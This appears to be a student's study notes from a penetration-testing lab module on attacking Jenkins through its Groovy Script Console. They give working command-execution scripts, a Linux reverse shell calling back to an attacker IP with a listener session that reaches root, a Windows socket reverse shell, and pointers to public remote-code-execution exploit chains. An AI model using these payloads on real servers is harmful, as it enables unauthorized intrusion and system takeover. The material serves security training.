---
description: >-
  a quick way of achieving command execution on the underlying server is via the
  Script Console
---

# Attacking Jenkins

**Script Console** -> allows us to run arbitrary Groovy scripts within the Jenkins controller runtime.

we can abuse it to run operating system commands on the underlying server

### Script Console

* URL `http://jenkins.inlanefreight.local:8000/script`
* &#x20;This console allows a user to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache\_Groovy) scripts
  * object-oriented Java-compatible language similar to Python and Ruby
* Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed
* it is possible to run arbitrary commands, functioning similarly to a web shell

**Groovy script**

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

<figure><img src="https://academy.hackthebox.com/storage/modules/113/groovy_web.png" alt=""><figcaption><p>http://jenkins.inlanefreight.local:8000/script</p></figcaption></figure>

**Groovy reverse shell**

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```shell-session
nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```

* we could attempt to add a user and connect to the host via RDP or WinRM

**commands for a Windows-based Jenkins**

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

We could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host

**Groovy Windows reverse shell**

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Miscellaneous Vulnerabilities

* recent exploit combines two vulnerabilities, CVE-2018-1999002 and [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) to achieve pre-authenticated remote code execution
* Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file
* Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js
  * This requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.

## Assessment

Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory

<figure><img src="../../../.gitbook/assets/ภาพ (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/ภาพ (8).png" alt=""><figcaption></figcaption></figure>
